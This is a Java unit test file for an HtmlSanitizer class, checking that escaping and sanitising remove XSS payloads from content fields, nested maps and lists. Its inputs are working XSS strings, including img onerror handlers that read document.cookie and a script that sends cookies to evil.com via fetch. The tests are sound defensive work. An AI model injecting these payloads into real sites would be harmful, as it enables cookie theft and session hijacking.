package org.sunbird.common;

import org.junit.Assert;
import org.junit.Test;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class HtmlSanitizerTest {

    // === escapeHtml tests ===

    @Test
    public void testEscapeHtmlWithScriptTag() {
        String input = "<script>alert('xss')</script>";
        String result = HtmlSanitizer.escapeHtml(input);
        Assert.assertFalse(result.contains("<script>"));
        Assert.assertTrue(result.contains("&lt;script&gt;"));
    }

    @Test
    public void testEscapeHtmlWithImgOnerror() {
        String input = "<img src=x onerror=\"steal(document.cookie)\">";
        String result = HtmlSanitizer.escapeHtml(input);
        Assert.assertFalse("Should not contain raw HTML tag", result.contains("<img"));
        Assert.assertTrue("Should contain escaped tag", result.contains("&lt;img"));
        Assert.assertTrue("Should contain escaped quotes", result.contains("&quot;"));
    }

    @Test
    public void testEscapeHtmlPreservesPlainText() {
        String input = "Paris is the capital of France";
        Assert.assertEquals(input, HtmlSanitizer.escapeHtml(input));
    }

    @Test
    public void testEscapeHtmlWithNull() {
        Assert.assertNull(HtmlSanitizer.escapeHtml(null));
    }

    @Test
    public void testEscapeHtmlWithEmpty() {
        Assert.assertEquals("", HtmlSanitizer.escapeHtml(""));
    }

    @Test
    public void testEscapeHtmlWithAmpersand() {
        String input = "Tom & Jerry";
        Assert.assertEquals("Tom &amp; Jerry", HtmlSanitizer.escapeHtml(input));
    }

    @Test
    public void testEscapeHtmlWithAllSpecialChars() {
        String input = "<div class=\"test\">'hello'</div>";
        String result = HtmlSanitizer.escapeHtml(input);
        Assert.assertTrue(result.contains("&lt;"));
        Assert.assertTrue(result.contains("&gt;"));
        Assert.assertTrue(result.contains("&quot;"));
        Assert.assertTrue(result.contains("&#39;"));
    }

    // === sanitizeStrict tests ===

    @Test
    public void testSanitizeStrictStripsAllHtml() {
        String input = "<script>alert(1)</script>Hello";
        String result = HtmlSanitizer.sanitizeStrict(input);
        Assert.assertFalse(result.contains("<script>"));
        Assert.assertTrue(result.contains("Hello"));
    }

    @Test
    public void testSanitizeStrictStripsImgTag() {
        String input = "Test<img src=x onerror=alert(1)>Name";
        String result = HtmlSanitizer.sanitizeStrict(input);
        Assert.assertFalse(result.contains("<img"));
        Assert.assertFalse(result.contains("onerror"));
        Assert.assertTrue(result.contains("Test"));
        Assert.assertTrue(result.contains("Name"));
    }

    @Test
    public void testSanitizeStrictPreservesPlainText() {
        String input = "Normal content name";
        Assert.assertEquals(input, HtmlSanitizer.sanitizeStrict(input));
    }

    @Test
    public void testSanitizeStrictWithNull() {
        Assert.assertNull(HtmlSanitizer.sanitizeStrict(null));
    }

    @Test
    public void testSanitizeStrictStripsIframe() {
        String input = "<iframe src=\"http://evil.com\"></iframe>Safe";
        String result = HtmlSanitizer.sanitizeStrict(input);
        Assert.assertFalse(result.contains("<iframe"));
        Assert.assertTrue(result.contains("Safe"));
    }

    @Test
    public void testSanitizeStrictStripsEventHandlers() {
        String input = "<div onmouseover=\"steal()\">Hover me</div>";
        String result = HtmlSanitizer.sanitizeStrict(input);
        Assert.assertFalse(result.contains("onmouseover"));
        Assert.assertFalse(result.contains("steal"));
    }

    // === sanitizeRichText tests ===

    @Test
    public void testSanitizeRichTextAllowsSafeTags() {
        String input = "<p>Hello <b>world</b></p>";
        String result = HtmlSanitizer.sanitizeRichText(input);
        Assert.assertTrue(result.contains("<p>"));
        Assert.assertTrue(result.contains("<b>"));
    }

    @Test
    public void testSanitizeRichTextStripsScript() {
        String input = "<p>Safe</p><script>alert(1)</script>";
        String result = HtmlSanitizer.sanitizeRichText(input);
        Assert.assertTrue(result.contains("<p>"));
        Assert.assertFalse(result.contains("<script>"));
    }

    @Test
    public void testSanitizeRichTextStripsOnerror() {
        String input = "<p>Text</p><img src=x onerror=\"steal()\">";
        String result = HtmlSanitizer.sanitizeRichText(input);
        Assert.assertTrue(result.contains("<p>"));
        Assert.assertFalse(result.contains("onerror"));
    }

    @Test
    public void testSanitizeRichTextAllowsMathTags() {
        String input = "<math><mrow><mi>x</mi><mo>+</mo><mn>1</mn></mrow></math>";
        String result = HtmlSanitizer.sanitizeRichText(input);
        Assert.assertTrue(result.contains("<math>"));
        Assert.assertTrue(result.contains("<mi>"));
    }

    @Test
    public void testSanitizeRichTextAllowsTableTags() {
        String input = "<table><tr><td colspan=\"2\">Cell</td></tr></table>";
        String result = HtmlSanitizer.sanitizeRichText(input);
        Assert.assertTrue(result.contains("<table>"));
        Assert.assertTrue(result.contains("<td"));
    }

    // === sanitizeField tests (routing logic) ===

    @Test
    public void testSanitizeFieldBodyUsesRichText() {
        String input = "<p>Safe</p><script>evil</script>";
        String result = HtmlSanitizer.sanitizeField("body", input);
        Assert.assertTrue(result.contains("<p>"));
        Assert.assertFalse(result.contains("<script>"));
    }

    @Test
    public void testSanitizeFieldNameUsesStrict() {
        String input = "<script>alert(1)</script>My Content";
        String result = HtmlSanitizer.sanitizeField("name", input);
        Assert.assertFalse(result.contains("<script>"));
        Assert.assertTrue(result.contains("My Content"));
    }

    @Test
    public void testSanitizeFieldDescriptionUsesStrict() {
        String input = "Desc<img src=x onerror=alert(1)>";
        String result = HtmlSanitizer.sanitizeField("description", input);
        Assert.assertFalse(result.contains("<img"));
        Assert.assertTrue(result.contains("Desc"));
    }

    // === sanitizeMap tests (recursive) ===

    @Test
    public void testSanitizeMapStripsXssFromName() {
        Map<String, Object> data = new HashMap<>();
        data.put("name", "<script>alert('xss')</script>Test Content");
        data.put("code", "test-code");
        HtmlSanitizer.sanitizeMap(data);
        Assert.assertFalse(((String) data.get("name")).contains("<script>"));
        Assert.assertTrue(((String) data.get("name")).contains("Test Content"));
        Assert.assertEquals("test-code", data.get("code"));
    }

    @Test
    public void testSanitizeMapStripsXssFromDescription() {
        Map<String, Object> data = new HashMap<>();
        data.put("description", "<img src=x onerror=\"document.cookie\">");
        HtmlSanitizer.sanitizeMap(data);
        Assert.assertFalse(((String) data.get("description")).contains("<img"));
    }

    @Test
    public void testSanitizeMapHandlesNestedMaps() {
        Map<String, Object> inner = new HashMap<>();
        inner.put("label", "<script>steal()</script>Option A");
        Map<String, Object> data = new HashMap<>();
        data.put("interactions", inner);
        HtmlSanitizer.sanitizeMap(data);
        Map<String, Object> sanitizedInner = (Map<String, Object>) data.get("interactions");
        Assert.assertFalse(((String) sanitizedInner.get("label")).contains("<script>"));
    }

    @Test
    public void testSanitizeMapHandlesLists() {
        List<Object> options = new ArrayList<>();
        options.add("<script>xss</script>Option1");
        options.add("Option2");
        Map<String, Object> data = new HashMap<>();
        data.put("options", options);
        HtmlSanitizer.sanitizeMap(data);
        List<Object> sanitized = (List<Object>) data.get("options");
        Assert.assertFalse(((String) sanitized.get(0)).contains("<script>"));
        Assert.assertEquals("Option2", sanitized.get(1));
    }

    @Test
    public void testSanitizeMapHandlesNullMap() {
        HtmlSanitizer.sanitizeMap(null); // should not throw
    }

    @Test
    public void testSanitizeMapHandlesEmptyMap() {
        Map<String, Object> data = new HashMap<>();
        HtmlSanitizer.sanitizeMap(data); // should not throw
        Assert.assertTrue(data.isEmpty());
    }

    @Test
    public void testSanitizeMapPreservesNonStringValues() {
        Map<String, Object> data = new HashMap<>();
        data.put("name", "Safe Name");
        data.put("maxScore", 100);
        data.put("isPublished", true);
        HtmlSanitizer.sanitizeMap(data);
        Assert.assertEquals("Safe Name", data.get("name"));
        Assert.assertEquals(100, data.get("maxScore"));
        Assert.assertEquals(true, data.get("isPublished"));
    }

    // === XSS attack vector tests (from security report) ===

    @Test
    public void testXssVuln01_QuestionBodyPayload() {
        String payload = "<img src=x onerror=\"var d=document.createElement('div');d.id='xss-proof';" +
                "d.innerText='COOKIES:'+document.cookie;document.body.appendChild(d)\">";
        String result = HtmlSanitizer.sanitizeField("body", payload);
        Assert.assertFalse(result.contains("onerror"));
        Assert.assertFalse(result.contains("document.cookie"));
    }

    @Test
    public void testXssVuln02_OptionLabelPayload() {
        String payload = "<img src=x onerror=\"document.title='XSS-VULN-02: '+document.cookie\">";
        String escaped = HtmlSanitizer.escapeHtml(payload);
        Assert.assertFalse(escaped.contains("<img"));
        Assert.assertTrue(escaped.contains("&lt;img"));
    }

    @Test
    public void testXssVuln03_ContentNamePayload() {
        String payload = "<script>fetch('http://evil.com?c='+document.cookie)</script>Legit Name";
        String result = HtmlSanitizer.sanitizeField("name", payload);
        Assert.assertFalse(result.contains("<script>"));
        Assert.assertFalse(result.contains("fetch("));
        Assert.assertTrue(result.contains("Legit Name"));
    }

    @Test
    public void testXssVuln06_FrameworkTranslationsPayload() {
        String payload = "<img src=x onerror=\"console.log('XSS-TRANSLATIONS')\">";
        String result = HtmlSanitizer.sanitizeField("translations", payload);
        Assert.assertFalse(result.contains("<img"));
        Assert.assertFalse(result.contains("onerror"));
    }

    @Test
    public void testSanitizeMapPreservesMimeType() {
        Map<String, Object> data = new HashMap<>();
        data.put("mimeType", "image/svg+xml");
        data.put("name", "Test Asset");
        HtmlSanitizer.sanitizeMap(data);
        Assert.assertEquals("image/svg+xml", data.get("mimeType"));
    }

    @Test
    public void testSanitizeMapWithFrameworkXssPayload() {
        Map<String, Object> data = new HashMap<>();
        data.put("name", "<script>alert('xss-framework')</script>");
        data.put("description", "<img src=x onerror=alert(document.cookie)>");
        Map<String, Object> translations = new HashMap<>();
        translations.put("hi", "<img src=x onerror=\"console.log('XSS')\">");
        data.put("translations", translations);
        HtmlSanitizer.sanitizeMap(data);
        Assert.assertFalse(((String) data.get("name")).contains("<script>"));
        Assert.assertFalse(((String) data.get("description")).contains("<img"));
        Map<String, Object> sanitizedTranslations = (Map<String, Object>) data.get("translations");
        Assert.assertFalse(((String) sanitizedTranslations.get("hi")).contains("onerror"));
    }
}
